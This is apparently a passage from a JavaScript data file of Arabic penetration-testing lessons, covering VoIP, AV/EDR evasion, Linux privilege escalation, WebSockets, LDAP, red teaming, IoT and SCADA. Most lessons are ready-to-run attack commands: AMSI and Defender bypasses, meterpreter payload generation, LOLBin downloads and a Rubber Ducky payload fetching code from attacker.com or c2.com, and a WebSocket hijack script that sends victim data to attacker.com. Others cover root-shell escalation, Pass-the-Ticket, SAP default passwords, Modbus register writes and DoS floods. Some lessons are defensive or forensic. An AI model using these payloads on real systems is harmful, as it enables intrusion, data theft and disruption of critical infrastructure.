  {title:'Supply Chain Attacks',text:'هجمات سلسلة التوريد تستهدف packages وdependencies.',cmd:'# فحص packages:\npip-audit  # Python\nnpm audit  # Node.js\nbundler-audit  # Ruby\n# فحص typosquatting:\npypi-search $(cat requirements.txt | cut -d= -f1)',cmdDesc:'الكشف عن Supply Chain Attacks'}
 ]
},
{id:46,title:'اختبار أمان الـ VoIP والـ SIP',icon:'📞',level:'intermediate',cat:'network',
 tags:['VoIP','SIP','RTP','Asterisk'],
 desc:'اكتشاف واستغلال ثغرات بروتوكولات الصوت عبر الإنترنت.',
 steps:[
  {title:'استطلاع SIP',text:'SIPVicious من أفضل أدوات فحص SIP. يكتشف servers وextensions.',cmd:'apt install sipvicious\nsvmap 192.168.1.0/24  # اكتشاف SIP servers\nsvwar -e100-200 192.168.1.10  # تعداد extensions',cmdDesc:'استطلاع SIP Servers'},
  {title:'SIP Brute Force',text:'Brute force على extensions SIP للحصول على credentials.',cmd:'svcrack -u 100 -d rockyou.txt 192.168.1.10\n# أو Hydra:\nhydra -l 100 -P rockyou.txt sip://192.168.1.10',cmdDesc:'Brute Force على SIP Extensions'},
  {title:'SIP INVITE Flood - DoS',text:'إرسال INVITE طلبات كثيرة لإسقاط SIP server.',cmd:'# inviteflood (للمختبر فقط):\ninviteflood eth0 target 192.168.1.10 5060 1000\n# أو:\nsipvicious svwar --force-invite -e100-200 192.168.1.10',cmdDesc:'اختبار SIP DoS Resilience',note:'للبيئات المختبرية فقط.'},
  {title:'التنصت على مكالمات RTP',text:'RTP لا يُشفر افتراضياً. Wireshark يلتقط ويُعيد تشغيل المكالمات.',cmd:'# في Wireshark:\n# Telephony > VoIP Calls > اختر المكالمة > Play Streams\n# أو بـ tshark:\ntshark -r capture.pcap -Y "rtp" -T fields -e rtp.payload',cmdDesc:'التقاط وإعادة تشغيل مكالمات RTP'},
  {title:'Asterisk Security',text:'Asterisk PBX الشائع. الـ Manager Interface مكشوف كثيراً.',cmd:'# فحص Asterisk Manager Interface:\nnmap -sV -p 5038 target\ntelnet target 5038\n# Auth:\nAction: Login\nUsername: admin\nSecret: password',cmdDesc:'فحص Asterisk Manager Interface'}
 ]
},
{id:47,title:'هجمات Bypass الحماية',icon:'🛡️',level:'advanced',cat:'exploitation',
 tags:['AV Bypass','EDR Evasion','AMSI','Defender'],
 desc:'تقنيات تجاوز برامج مكافحة الفيروسات وأنظمة EDR الحديثة.',
 steps:[
  {title:'تجاوز AMSI في PowerShell',text:'AMSI يفحص PowerShell scripts. طرق تجاوزه كثيرة.',cmd:'# AMSI Bypass كلاسيكي:\n[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)\n# أو تشفير Base64:\nIEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("V3JpdGUtT3V0cHV0ICJBTVNJIEJ5cGFzc2VkISI=")))',cmdDesc:'تجاوز AMSI في PowerShell'},
  {title:'تجاوز Windows Defender',text:'Shellcode obfuscation وIn-memory execution لتجاوز Defender.',cmd:'# Veil Framework:\napt install veil\nveil -t Evasion -p powershell/meterpreter/rev_tcp --ip IP --port 4444 -o output\n# أو Shellter:\nwine shellter.exe  # inject في PE موجود',cmdDesc:'تجاوز Windows Defender'},
  {title:'Process Injection',text:'حقن shellcode في عملية موثوقة مثل explorer.exe أو svchost.exe.',cmd:'# في Meterpreter:\nmigrate -N explorer.exe\n# أو process injection بـ C:\n# VirtualAllocEx + WriteProcessMemory + CreateRemoteThread',cmdDesc:'Process Injection في Windows'},
  {title:'LOLBAS - Living off the Land',text:'استخدام أدوات Windows المدمجة لتجنب الكشف.',cmd:'# certutil لتحميل ملفات:\ncertutil.exe -urlcache -f http://attacker.com/payload.exe payload.exe\n# بديل PowerShell:\nbitsadmin /transfer myJob http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe\n# regsvr32:\nregsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll',cmdDesc:'LOLBAS Techniques لتجاوز الحماية'},
  {title:'C2 Traffic Obfuscation',text:'إخفاء حركة C2 داخل حركة HTTPS طبيعية أو DNS.',cmd:'# C2 عبر DNS:\n# استخدم DNScat2:\ndnscat2-server --security=open\n# على الضحية:\ndnscat2 --dns server=attacker.com --secret=password',cmdDesc:'إخفاء C2 Traffic داخل DNS'}
 ]
},
{id:48,title:'اختبار أمان نظام Linux المتقدم',icon:'🐧',level:'advanced',cat:'exploitation',
 tags:['Linux','Kernel','AppArmor','SELinux'],
 desc:'تقنيات متقدمة لاختبار أمان أنظمة Linux والـ Kernel.',
 steps:[
  {title:'LinPEAS المتقدم',text:'LinPEAS يفحص آلياً مئات مسارات رفع الصلاحيات في Linux.',cmd:'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# أو خفي:\ncurl -sL linpeas_url | sh 2>/dev/null\n# حفظ النتائج:\n./linpeas.sh > /tmp/linpeas_output.txt 2>&1',cmdDesc:'تشغيل LinPEAS المتقدم'},
  {title:'Shared Library Hijacking',text:'إذا كانت مكتبة مشتركة قابلة للكتابة أو في PATH قابلة للكتابة.',cmd:'find / -writable -name "*.so" 2>/dev/null\nldd /usr/bin/vulnerable_binary\n# إذا وجدت مكتبة في /home/user/lib:\nexport LD_LIBRARY_PATH=/writable/path\ncp malicious.so /writable/path/libvictim.so',cmdDesc:'Shared Library Hijacking'},
  {title:'Sudo Misconfiguration',text:'sudo -l يكشف الأوامر المسموح تشغيلها كـ root. GTFOBins يشرح كيفية استغلالها.',cmd:'sudo -l\n# إذا وجدت: (root) NOPASSWD: /usr/bin/find\nsudo find /etc/passwd -exec /bin/bash \\;\n# إذا: (root) NOPASSWD: /usr/bin/python3\nsudo python3 -c "import os; os.system(\'/bin/bash\')"',cmdDesc:'استغلال Sudo Misconfiguration'},
  {title:'Capabilities Abuse',text:'Linux Capabilities بديل لـ SUID. بعضها خطير جداً.',cmd:'getcap -r / 2>/dev/null\n# cap_setuid خطيرة:\n/usr/bin/python3 = cap_setuid+ep\npython3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',cmdDesc:'استغلال Linux Capabilities'},
  {title:'تجاوز AppArmor',text:'AppArmor يقيّد تصرفات العمليات. بعض الـ profiles قد تكون لينة.',cmd:'aa-status  # عرض الـ profiles\n# تحقق من وضع enforcement:\ncat /proc/1/attr/current\n# bypass عبر عملية غير محمية:\naa-complain /etc/apparmor.d/usr.bin.vulnerable',cmdDesc:'فحص وتجاوز AppArmor'}
 ]
},
{id:49,title:'التحليل الجنائي للـ Memory',icon:'🧠',level:'advanced',cat:'forensics',
 tags:['Volatility','Memory Forensics','Artifacts'],
 desc:'تحليل متعمق لـ Memory Dumps باستخدام Volatility 3.',
 steps:[
  {title:'التقاط Memory Dump',text:'winpmem وLiME لالتقاط ذاكرة أنظمة Windows وLinux.',cmd:'# Windows:\nwinpmem.exe memory.raw\n# Linux LiME:\ninsmod lime.ko "path=/tmp/memory.lime format=lime"\n# VirtualBox VM:\nVBoxManage debugvm "VM_Name" dumpguestcore --filename vm.elf',cmdDesc:'التقاط Memory Dump'},
  {title:'تحليل Processes بـ Volatility',text:'volatility3 أسرع وأسهل من v2. يكتشف العمليات المخفية.',cmd:'pip install volatility3\nvol -f memory.raw windows.pslist  # قائمة العمليات\nvol -f memory.raw windows.pstree  # شجرة العمليات\nvol -f memory.raw windows.psscan  # يكشف العمليات المخفية',cmdDesc:'تحليل العمليات في الذاكرة'},
  {title:'استخراج Malware من الذاكرة',text:'malfind يكشف الكود المحقون في العمليات.',cmd:'vol -f memory.raw windows.malfind\nvol -f memory.raw windows.malfind --dump\n# تحليل الـ dumps:\nfile pid.*.dmp\nstrings pid.*.dmp | grep -i "http\|cmd\|powershell"',cmdDesc:'كشف واستخراج الكود الخبيث من الذاكرة'},
  {title:'تحليل الشبكة من الذاكرة',text:'نتائج الاتصالات الشبكية المخفية من الذاكرة.',cmd:'vol -f memory.raw windows.netstat\nvol -f memory.raw windows.netscan\n# استخراج اتصالات نشطة:\nvol -f memory.raw windows.netstat | grep ESTABLISHED',cmdDesc:'تحليل الاتصالات الشبكية من الذاكرة'},
  {title:'تحليل Registry Artifacts',text:'Registry في الذاكرة يحتوي معلومات قيّمة عن النشاط الأخير.',cmd:'vol -f memory.raw windows.registry.hivelist\nvol -f memory.raw windows.registry.printkey --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"\nvol -f memory.raw windows.registry.userassist',cmdDesc:'تحليل Registry من الذاكرة'}
 ]
},
{id:50,title:'اختبار الأمان الفيزيائي',icon:'🏢',level:'intermediate',cat:'recon',
 tags:['Physical Security','Lockpicking','Badge Cloning'],
 desc:'تقنيات اختبار الأمان الفيزيائي المستخدمة في pentesting مرخص.',
 steps:[
  {title:'استطلاع المبنى',text:'جمع معلومات عن المبنى والموظفين والأنظمة الأمنية قبل الدخول.',cmd:'# أدوات الاستطلاع:\n# - Google Maps / Street View\n# - LinkedIn للموظفين\n# - Shodan للأجهزة\n# - theHarvester للإيميلات\ntheHarvester -d company.com -b linkedin,google',cmdDesc:'استطلاع المبنى والموظفين'},
  {title:'Badge Cloning - RFID',text:'Proxmark3 يستنسخ بطاقات RFID/NFC. 125kHz أسهل في الاستنساخ.',cmd:'proxmark3 /dev/ttyACM0\n# scan RFID:\nhf search\n# clone to writable card:\nhf mf clone\n# أو:\nlf hid clone -r RAW_DATA',cmdDesc:'استنساخ بطاقات RFID بـ Proxmark3'},
  {title:'Raspberry Pi Rubber Ducky',text:'USB Rubber Ducky يُنفّذ أوامر في ثوانٍ عند توصيله.',cmd:'# على Raspberry Pi Zero W:\napt install dnsmasq hostapd\n# إنشاء HID payload:\ncat payload.duck\n# DELAY 1000\n# GUI r\n# DELAY 500\n# STRING powershell\n# ENTER\n# STRING IEX(New-Object Net.WebClient).DownloadString("http://c2.com/payload")\n# ENTER',cmdDesc:'إنشاء USB HID Attack Payload'},
  {title:'Wireless Rogue AP',text:'نقطة وصول مزيفة تستهدف زوار المبنى.',cmd:'# بـ hostapd:\napt install hostapd dnsmasq\ncat > hostapd.conf << EOF\ninterface=wlan0\nssid=CompanyWiFi_Guest\nchannel=6\nEOF\nhostapd hostapd.conf &',cmdDesc:'إنشاء Rogue Access Point داخل المبنى',note:'للاختبار المرخص فقط.'},
  {title:'تقرير Physical Pentest',text:'التقرير يوثق نقاط الضعف الفيزيائية مع توصيات محددة.',cmd:'# نموذج التقرير:\n# 1. نقاط الدخول المكتشفة\n# 2. أنظمة RFID الضعيفة\n# 3. كاميرات المراقبة blind spots\n# 4. الموظفون المعرضون للـ Social Engineering\n# 5. التوصيات والحلول',cmdDesc:'توثيق نتائج Physical Pentest'}
 ]
},
{id:51,title:'اختبار أمان الـ WebSockets',icon:'🔌',level:'intermediate',cat:'web',
 tags:['WebSocket','Real-time','CSWSH'],
 desc:'اكتشاف ثغرات WebSocket من CSWSH إلى Message Injection.',
 steps:[
  {title:'استطلاع WebSocket Endpoints',text:'اكتشاف WebSocket endpoints في التطبيقات.',cmd:'# في Burp Suite:\n# Proxy > WebSockets History\n# ابحث عن: ws:// أو wss://\n# أو بـ nikto:\nnikto -h target.com | grep websocket\n# بـ nmap:\nnmap --script http-websocket-info target.com',cmdDesc:'اكتشاف WebSocket Endpoints'},
  {title:'CSWSH - Cross-Site WebSocket Hijacking',text:'WebSocket لا يتحقق من Origin افتراضياً. يمكن خطف الاتصال من موقع آخر.',cmd:'# HTML page على موقع المهاجم:\nvar ws = new WebSocket("wss://victim.com/chat");\nws.onmessage = function(msg) {\n  fetch("https://attacker.com/steal?data="+btoa(msg.data));\n};',cmdDesc:'استغلال CSWSH لسرقة بيانات'},
  {title:'Message Injection',text:'إذا لم يُحقق الخادم من محتوى الرسائل، injection ممكن.',cmd:'# في Burp WebSocket History:\n# كليك يمين > Send to Repeater\n# غيّر محتوى الرسالة:\n{"message": "<script>alert(1)</script>"}',cmdDesc:'Message Injection في WebSocket'},
  {title:'Denial of Service',text:'إرسال رسائل ضخمة أو كثيرة لاستنزاف موارد الخادم.',cmd:'# Python WebSocket DoS:\nimport websocket\nws = websocket.WebSocket()\nws.connect("ws://target.com/ws")\nwhile True:\n  ws.send("A" * 65536)',cmdDesc:'WebSocket DoS Test',note:'للبيئات المختبرية فقط.'},
  {title:'تشفير WebSocket',text:'wss:// مشفر لكن المحتوى قد يكون ضعيفاً. wscat للاختبار.',cmd:'apt install nodejs npm\nnpm install -g wscat\n# اتصال بـ WebSocket:\nwscat -c ws://target.com/ws\n# أو مشفر:\nwscat -c wss://target.com/ws',cmdDesc:'اختبار WebSocket بـ wscat'}
 ]
},
{id:52,title:'اختبار بروتوكول LDAP',icon:'📂',level:'intermediate',cat:'network',
 tags:['LDAP','Active Directory','LDAP Injection'],
 desc:'فحص واستغلال بروتوكول LDAP في بيئات Active Directory.',
 steps:[
  {title:'Enumeration بـ LDAP',text:'LDAP يحتوي معلومات قيّمة عن المستخدمين والمجموعات والـ policies.',cmd:'ldapsearch -x -H ldap://192.168.1.10 -b "dc=corp,dc=local"\nldapsearch -x -H ldap://IP -b "dc=domain,dc=com" -D "user@domain.com" -w "password" "(objectClass=person)"',cmdDesc:'استعلامات LDAP الأساسية'},
  {title:'LDAP Injection',text:'تطبيقات الويب التي تستخدم LDAP مباشرة عرضة للـ LDAP Injection.',cmd:'# في حقل username:\n*)(uid=*))(|(uid=*\n# هذا يحوّل الاستعلام لـ: (&(uid=*)(uid=*))\n# يُرجع جميع المستخدمين!',cmdDesc:'استغلال LDAP Injection'},
  {title:'Pass-the-Ticket',text:'استخدام Kerberos tickets مسروقة للتحرك في AD.',cmd:'# في Mimikatz:\nsekurlsa::tickets /export\n# ثم:\nkerberos::ptt [ticket.kirbi]\n# استخدام impacket:\nimpacket-psexec -k -no-pass corp.local/admin@DC_IP',cmdDesc:'Pass-the-Ticket Attack'},
  {title:'LDAP Anonymous Bind',text:'LDAP بدون مصادقة كثيراً ما يكشف معلومات قيّمة.',cmd:'ldapsearch -x -H ldap://192.168.1.10 -b "" -s base namingContexts\nldapsearch -x -H ldap://IP -b "dc=corp,dc=local" -s sub "(objectClass=*)"',cmdDesc:'LDAP Anonymous Bind'},
  {title:'ldapdomaindump',text:'ldapdomaindump يصدّر بيانات AD بصيغة HTML قابلة للقراءة.',cmd:'ldapdomaindump -u "CORP\\user" -p "Password123" ldap://DC_IP\n# فتح النتائج:\npython3 -m http.server\n# افتح http://localhost:8000',cmdDesc:'تصدير بيانات AD بصيغة HTML'}
 ]
},
{id:53,title:'أتمتة اختبار الاختراق',icon:'🤖',level:'intermediate',cat:'basics',
 tags:['Automation','Python','Bash Scripting'],
 desc:'أتمتة مهام اختبار الاختراق باستخدام Python وBash.',
 steps:[
  {title:'Python للاستطلاع التلقائي',text:'Python3 مع Scapy وRequests لأتمتة الاستطلاع.',cmd:'import subprocess, sys\n\ndef full_recon(domain):\n    print(f"[*] Recon: {domain}")\n    subprocess.run(["subfinder","-d",domain,"-o","subs.txt"])\n    subprocess.run(["theHarvester","-d",domain,"-b","all","-l","200"])\n    subprocess.run(["nmap","-sV","-sC",domain,"-oA","nmap_"+domain])\n\nfull_recon(sys.argv[1])',cmdDesc:'سكريبت استطلاع تلقائي'},
  {title:'Bash لأتمتة الفحص',text:'Bash script يجمع عدة أدوات في workflow متكامل.',cmd:'#!/bin/bash\nTARGET=$1\necho "[+] Starting scan: $TARGET"\nnmap -sV -sC -T4 $TARGET -oN nmap.txt &\ngobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt &\nnikto -h $TARGET -o nikto.txt &\nwait && echo "[+] Done!"',cmdDesc:'Bash Script لأتمتة الفحص الأولي'},
  {title:'Python لاستغلال SQL Injection',text:'كتابة Python script مخصص لاستغلال ثغرة SQL Injection.',cmd:'import requests\n\nurl = "http://target.com/search.php"\n\nfor i in range(1,11):\n    payload = f"1 UNION SELECT 1,table_name,3 FROM information_schema.tables LIMIT {i},1-- -"\n    r = requests.get(url, params={"id": payload})\n    print(f"Table {i}:", r.text[:100])',cmdDesc:'Python Script لاستخراج بيانات SQL Injection'},
  {title:'Metasploit Resource Scripts',text:'Resource scripts تؤتمت تسلسلات متعددة في Metasploit.',cmd:'cat > auto_exploit.rc << EOF\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.5\nset LPORT 4444\nexploit -j\nEOF\nmsfconsole -r auto_exploit.rc',cmdDesc:'Metasploit Resource Scripts'},
  {title:'إنشاء أداة فحص مخصصة',text:'بناء أداة Python كاملة مع argparse وconcurrent threads.',cmd:'import argparse, concurrent.futures, requests\n\nparser = argparse.ArgumentParser()\nparser.add_argument("url")\nparser.add_argument("-w","--wordlist",default="/usr/share/wordlists/dirb/common.txt")\nargs = parser.parse_args()\n\nwith open(args.wordlist) as f:\n    paths = f.read().splitlines()\n\ndef check(path):\n    r = requests.get(f"{args.url}/{path}", timeout=5)\n    if r.status_code == 200:\n        print(f"[+] Found: /{path} ({r.status_code})")\n\nwith concurrent.futures.ThreadPoolExecutor(20) as ex:\n    ex.map(check, paths)',cmdDesc:'بناء Directory Scanner مخصص بـ Python'}
 ]
},
{id:54,title:'Red Team Operations',icon:'🔴',level:'advanced',cat:'exploitation',
 tags:['Red Team','APT','C2','Cobalt Strike'],
 desc:'منهجية Red Team الاحترافية من التخطيط إلى التقرير.',
 steps:[
  {title:'تخطيط Red Team Operation',text:'Red Team يحاكي هجوم APT حقيقي. يحتاج تخطيطاً دقيقاً وإذناً شاملاً.',cmd:'# وثيقة Rules of Engagement تحدد:\n# - الأهداف (assets in scope)\n# - الأساليب المسموحة\n# - نافذة الزمن\n# - قنوات الاتصال الآمنة\n# - بنود الطوارئ (Get-Out-of-Jail card)',cmdDesc:'تخطيط Red Team Engagement'},
  {title:'Initial Access Techniques',text:'Red Team يستخدم تقنيات متعددة للوصول الأولي مثل phishing وzero-days.',cmd:'# Spear Phishing:\ngophish server &\n# Watering Hole:\n# أنشئ موقعاً يستهدف موظفي الشركة\n# HTA مع macro:\nmsfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -f hta-psh -o payload.hta',cmdDesc:'أساليب الوصول الأولي'},
  {title:'Cobalt Strike بديلاً - Sliver',text:'Sliver C2 Framework مفتوح المصدر وبديل قانوني لـ Cobalt Strike.',cmd:'# تثبيت Sliver:\ncurl https://sliver.sh/install|sudo bash\nsliver-server\n# في Sliver console:\ngenerate --mtls attacker.com --os windows --arch amd64\nmtls --lport 443',cmdDesc:'إعداد Sliver C2 Framework'},
  {title:'Living off the Land - LOLBins',text:'تقليل الأثر باستخدام أدوات Windows المدمجة قدر الإمكان.',cmd:'# تنفيذ بدون كتابة ملفات:\nrundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")\n# MSHTA:\nmshta http://attacker.com/payload.hta\n# regsvcs:\nregsvcs.exe /U attacker.dll',cmdDesc:'LOLBins للتنفيذ بدون كتابة ملفات'},
  {title:'Red Team Report',text:'تقرير Red Team يحاكي تقرير APT مع timeline وattack chain.',cmd:'# محتوى تقرير Red Team:\n# 1. Executive Summary\n# 2. Attack Timeline\n# 3. Attack Chain (Kill Chain)\n# 4. Techniques Used (MITRE ATT&CK mapping)\n# 5. Dwell Time\n# 6. Detection Failures\n# 7. Recommendations',cmdDesc:'كتابة Red Team Report الاحترافي'}
 ]
},
{id:55,title:'الأمان السيبراني الدفاعي - Blue Team',icon:'🔵',level:'intermediate',cat:'basics',
 tags:['Blue Team','SIEM','SOC','Threat Hunting'],
 desc:'تقنيات الدفاع السيبراني والكشف عن التهديدات للفرق الدفاعية.',
 steps:[
  {title:'إعداد SIEM بـ Splunk',text:'Splunk يجمع ويحلل logs من مصادر متعددة لاكتشاف التهديدات.',cmd:'# تثبيت Splunk Free:\nwget https://download.splunk.com/products/splunk/releases/.../splunk.rpm\nrpm -i splunk.rpm\n/opt/splunk/bin/splunk start\n# أو ELK Stack مجاناً:\ndocker-compose up -d',cmdDesc:'إعداد SIEM لجمع Logs'},
  {title:'Threat Hunting بـ Elastic',text:'Elastic SIEM + EQL (Event Query Language) للبحث عن التهديدات.',cmd:'# EQL query لاكتشاف lateral movement:\nsequence by host.name\n  [process where process.name == "psexec.exe"]\n  [network where destination.port == 445]\n# KQL query:\nprocess.name: "mimikatz.exe" OR process.name: "lsass.exe"',cmdDesc:'Threat Hunting بـ Elastic EQL'},
  {title:'Windows Event Logs للـ Forensics',text:'Windows Event Logs تحتوي أدلة هجمات إذا فعّلت التسجيل الصحيح.',cmd:'# أهم Event IDs:\n# 4624: Successful logon\n# 4625: Failed logon\n# 4688: Process creation (مهم!)\n# 4698: Scheduled task created\n# 7045: New service installed\nGet-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]"',cmdDesc:'تحليل Windows Event Logs'},
  {title:'Sigma Rules',text:'Sigma rules صيغة موحدة لقواعد الكشف. تعمل على أي SIEM.',cmd:'pip install pySigma\n# قاعدة Sigma للكشف عن mimikatz:\n# title: Mimikatz Detection\n# logsource: category: process_creation\n# detection:\n#   selection: Image|contains: mimikatz\n# condition: selection\nsigma convert -t splunk rule.yml',cmdDesc:'كتابة وتحويل Sigma Rules'},
  {title:'Purple Team Exercise',text:'Purple Team يجمع Red وBlue معاً. Red يهاجم وBlue يراقب ويحسّن الكشف.',cmd:'# دورة Purple Team:\n# 1. Red Team ينفذ TTP محدد\n# 2. Blue Team يراقب: هل كُشف؟\n# 3. إذا لا: تحسين rules\n# 4. إعادة التنفيذ للتحقق\n# أدوات: Atomic Red Team, CALDERA\nInvoke-AtomicTest T1053.005 -TestNumbers 1',cmdDesc:'Purple Team Exercise باستخدام Atomic Red Team'}
 ]
},
{id:56,title:'اختبار أمان SAP وEnterprise',icon:'🏭',level:'advanced',cat:'exploitation',
 tags:['SAP','ERP','Enterprise','ABAP'],
 desc:'اكتشاف ثغرات في أنظمة SAP وبرامج ERP المؤسسية.',
 steps:[
  {title:'استطلاع أنظمة SAP',text:'Nmap وSAProuter للكشف عن مكونات SAP في الشبكة.',cmd:'nmap -sV -p 3200-3299,3300-3399,8000-8099,8100-8199 target\n# SAProuter:\nnmap --script=sap-verify target -p 3299\n# fuzz SAP services:\npython3 satass.py -t target',cmdDesc:'اكتشاف خدمات SAP'},
  {title:'SAP RFC Exploitation',text:'SAP RFC (Remote Function Call) قد يكون مكشوفاً. Metasploit modules لاختباره.',cmd:'msfconsole\nuse auxiliary/scanner/sap/sap_service_discovery\nset RHOSTS target\nrun\n# ثم:\nuse auxiliary/scanner/sap/sap_rfc_ping\nset RHOSTS target\nrun',cmdDesc:'فحص SAP RFC'},
  {title:'SAP Web Services',text:'ICM Web Server في SAP قد يكشف interfaces خطيرة.',cmd:'curl http://sap-server:8000/sap/bc/webrfc\ncurl http://sap-server:8000/sap/bc/soap/\n# بحث عن:\n# /sap/bc/bsp/ (BSP Applications)\n# /sap/bc/rest/ (REST APIs)\ncurl http://sap-server:8000/sap/public/bc/ur/login_ui5.html',cmdDesc:'فحص SAP Web Interfaces'},
  {title:'Default Credentials',text:'SAP يأتي بـ accounts افتراضية. تحقق منها دائماً.',cmd:'# Accounts افتراضية:\n# SAP* / 06071992 or PASS\n# DDIC / 19920706\n# EARLYWATCH / support\n# استخدام sapgui:\nsaplogon\n# أو python SAP client:\npython3 -c "from pyrfc import Connection; c=Connection(ashost=\'sap\',sysnr=\'00\',client=\'000\',user=\'sap*\',passwd=\'06071992\')"',cmdDesc:'اختبار Default Credentials في SAP'},
  {title:'SAP ABAP Code Injection',text:'تطبيقات SAP ABAP قد تسمح بتنفيذ كود ABAP مباشرة.',cmd:'# في SAP GUI: تشغيل transaction SE37\n# أو عبر RFC function:\n# CALL FUNCTION \'RFC_ABAP_INSTALL_AND_RUN\'\n# EXPORTING\n#   PROG = abap_code',cmdDesc:'ABAP Code Injection في SAP'}
 ]
},
{id:57,title:'اختبار الـ 5G والـ Telecom',icon:'📶',level:'advanced',cat:'wireless',
 tags:['5G','LTE','SS7','Telecom Security'],
 desc:'ثغرات شبكات الاتصالات من SS7 إلى 5G NR Security.',
 steps:[
  {title:'SS7 Signaling Attacks',text:'SS7 (Signaling System 7) بروتوكول 1970s يُستخدم اليوم. ثغراته خطيرة جداً.',cmd:'# أدوات SS7:\n# OpenBTS - مفتوح المصدر\n# SIMTester - فحص SIM cards\n# يحتاج وصولاً لشبكة SS7 (ISP أو MVNO)\n# أو SIM cards مخترقة\necho "SS7 attacks: Location tracking, SMS interception, Call redirection"',cmdDesc:'فهم ثغرات SS7'},
  {title:'IMSI Catchers - Stingrays',text:'IMSI Catchers تستحوذ على identifiers الهواتف المحيطة.',cmd:'# OpenBTS لبناء false base station:\n# تحتاج SDR (Software Defined Radio)\n# USRP N210 أو HackRF\napt install gnuradio\n# محاكاة محلية:\nopenBTS\necho "IMSI: International Mobile Subscriber Identity"',cmdDesc:'محاكاة IMSI Catcher مع OpenBTS'},
  {title:'LTE Security Analysis',text:'LTE أكثر أماناً من 2G/3G لكن عرضة لبعض الهجمات.',cmd:'# LTEInspector:\ngit clone https://github.com/uw-ictd/lte-threats.git\n# محاكاة LTE بـ OpenAirInterface:\ndocker run openairsoftware/oai-lte-ue:latest\n# فحص:\ngrgsm_livemon  # مراقبة GSM',cmdDesc:'تحليل أمان LTE'},
  {title:'GTP Tunneling Attacks',text:'GTP (GPRS Tunneling Protocol) عرضة لهجمات Tunneling و IP Spoofing.',cmd:'# GTP-U: حركة بيانات المستخدم\n# GTP-C: تحكم (أكثر خطورة)\n# Scapy لإنشاء GTP packets:\nfrom scapy.layers.gtp import *\npkt = GTP_U_Header()/IP(dst="8.8.8.8")/ICMP()\nsend(pkt)',cmdDesc:'فهم هجمات GTP في شبكات الجيل الثالث'},
  {title:'5G Security Architecture',text:'5G يُحسّن كثيراً من أمان شبكات الاتصال بـ SUPI/SUCI و N3IWF.',cmd:'# اختبار 5G SA (Standalone):\n# أدوات: free5GC + UERANSIM\ngit clone https://github.com/free5gc/free5gc.git\ngit clone https://github.com/aligungr/UERANSIM.git\n# محاكاة 5G كاملة:\ndocker-compose up -d',cmdDesc:'محاكاة واختبار 5G Core Network'}
 ]
},
{id:58,title:'أمان إنترنت الأشياء IoT',icon:'🏠',level:'intermediate',cat:'network',
 tags:['IoT','Firmware','MQTT','Embedded'],
 desc:'اختبار أمان أجهزة IoT من تحليل Firmware إلى اعتراض البروتوكولات.',
 steps:[
  {title:'Firmware Extraction وتحليل',text:'binwalk يستخرج محتوى Firmware وكشف نظام الملفات.',cmd:'binwalk -e firmware.bin\nbinwalk -A firmware.bin  # كشف معمارية CPU\nstrings firmware.bin | grep -i "password\|admin\|root\|token"\n# mount filesystem:\nmount -t squashfs squashfs-root.squashfs /mnt/firmware',cmdDesc:'تحليل Firmware استخراجاً وفحصاً'},
  {title:'MQTT Protocol Security',text:'MQTT بروتوكول IoT شائع. كثيراً ما يكون مفتوحاً بدون مصادقة.',cmd:'apt install mosquitto-clients\nmosquitto_sub -h target -t "#" -v  # الاشتراك بكل الـ topics\nmosquitto_pub -h target -t "home/switch" -m "ON"\n# فحص بـ nmap:\nnmap --script=mqtt-subscribe -p 1883 target',cmdDesc:'اختبار أمان MQTT Broker'},
  {title:'Shodan لاكتشاف IoT',text:'Shodan يجد أجهزة IoT مكشوفة حول العالم.',cmd:'shodan search "port:1883 mqtt"\nshodan search "title:webcam" country:SA\nshodan search "Hikvision" has_screenshot:true\n# روابط مكشوفة:\nshodan search "default password" port:8080',cmdDesc:'اكتشاف IoT Devices بـ Shodan'},
  {title:'UART وDebug Interface',text:'معظم أجهزة IoT تحتوي UART debug port. فتحه يعطي root shell.',cmd:'# بـ multimeter: ابحث عن TX,RX,GND\n# بعد التعرف عليها بـ Logic Analyzer:\n# استخدم USB-TTL adapter:\nscreen /dev/ttyUSB0 115200\n# أو:\npicocom -b 115200 /dev/ttyUSB0',cmdDesc:'الوصول لـ UART Debug Interface'},
  {title:'Emulation بـ QEMU',text:'QEMU يحاكي ARM/MIPS binaries من Firmware دون الحاجة للجهاز الحقيقي.',cmd:'apt install qemu-user-static\n# تحديد المعمارية:\nfile squashfs-root/bin/busybox\n# تشغيل:\nqemu-arm-static squashfs-root/bin/busybox\n# أو chroot:\nchroot squashfs-root /bin/sh',cmdDesc:'محاكاة Firmware بـ QEMU'}
 ]
},
{id:59,title:'اختبار أمان الـ SCADA/ICS',icon:'⚡',level:'advanced',cat:'network',
 tags:['SCADA','ICS','Modbus','DNP3'],
 desc:'فحص أمان أنظمة التحكم الصناعية والبنية التحتية الحيوية.',
 steps:[
  {title:'استطلاع أنظمة SCADA',text:'Shodan وCensys يجدان SCADA systems مكشوفة. بالغ الخطورة.',cmd:'shodan search "port:502 modbus"\nshodan search "port:102 siemens s7"\nshodan search "DNP3"\n# nmap:\nnmap --script=modbus-discover -p 502 target\nnmap --script=s7-info -p 102 target',cmdDesc:'اكتشاف SCADA Systems'},
  {title:'Modbus Protocol Security',text:'Modbus لا يحتوي مصادقة أو تشفير. أي جهاز يتصل يمكنه القراءة والكتابة.',cmd:'pip install pymodbus\npython3 << EOF\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient(\'target\', port=502)\nc.connect()\nresult = c.read_holding_registers(0, 10, slave=1)\nprint(result.registers)\nc.write_register(0, 1337, slave=1)  # خطير!\nEOF',cmdDesc:'قراءة وكتابة Modbus Registers'},
